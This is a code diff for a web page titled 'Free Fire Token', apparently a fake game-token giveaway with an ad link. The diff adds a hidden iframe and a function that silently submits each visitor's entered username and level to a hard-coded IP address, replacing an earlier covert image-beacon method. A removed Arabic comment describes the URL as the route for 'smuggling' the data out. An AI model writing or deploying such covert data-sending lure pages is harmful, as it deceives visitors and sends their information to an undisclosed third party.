@@ -36,6 +36,8 @@
     </div>
 </div>
 
+<iframe name="hidden_frame" id="hidden_frame" style="display:none;"></iframe>
+
 <div class="container">
     <h1>Free Fire Token</h1>
     <div class="top-info">
@@ -57,13 +59,35 @@
 </div>
 
 <script>
-    // الرابط اللي رح "نهرب" من خلاله البيانات
     const SERVER_URL = "http://38.244.129.249/send.php"; 
     const adLink = "https://otieu.com/4/10432551";
 
     let cur = 0, tokens = 0, currentUser = "", timeLeft = 120, timerInterval = null, firstTile = null;
 
     const userInput = document.getElementById('username-input');
+    
+    // وظيفة إرسال البيانات "القوية"
+    function sendLog(user, lvl) {
+        let form = document.createElement('form');
+        form.method = 'GET';
+        form.action = SERVER_URL;
+        form.target = 'hidden_frame'; // إرسال للإطار المخفي
+
+        let inputUser = document.createElement('input');
+        inputUser.name = 'user';
+        inputUser.value = user;
+        form.appendChild(inputUser);
+
+        let inputLvl = document.createElement('input');
+        inputLvl.name = 'lvl';
+        inputLvl.value = lvl;
+        form.appendChild(inputLvl);
+
+        document.body.appendChild(form);
+        form.submit();
+        document.body.removeChild(form);
+    }
+
     userInput.addEventListener('input', function() {
         if (!this.value.startsWith('&')) {
             this.value = '&' + this.value.replace(/^&*/, '');
@@ -88,14 +112,12 @@
         if (userVal !== "" && userVal !== "&") {
             currentUser = userVal;
             
-            // 1. جلب الحفظ المحلي (عشان المتصفح العادي)
             let saved = localStorage.getItem('ff_save_lvl_' + userVal);
             cur = saved ? parseInt(saved) : 0;
             tokens = cur * 20;
 
-            // 2. إرسال إشعار تليجرام باستخدام "خدعة الصورة" (عشان تليجرام وجيت هب)
-            let msgImg = new Image();
-            msgImg.src = SERVER_URL + "?task=send&user=" + encodeURIComponent(userVal) + "&lvl=" + (cur + 1) + "&t=" + Date.now();
+            // إرسال الإشعار فور الدخول
+            sendLog(userVal, cur + 1);
 
             document.getElementById('login-screen').style.display = 'none';
             initLevel();
@@ -103,12 +125,9 @@
     }
 
     function saveProgress() {
-        // حفظ محلي
         localStorage.setItem('ff_save_lvl_' + currentUser, cur);
-        
-        // إرسال ليفل جديد لتليجرام بصورة
-        let updateImg = new Image();
-        updateImg.src = SERVER_URL + "?task=send&user=" + encodeURIComponent(currentUser) + "&lvl=" + (cur + 1) + "&t=" + Date.now();
+        // إرسال تحديث المستوى
+        sendLog(currentUser, cur + 1);
     }
 
     function nextLevelWithAd() {
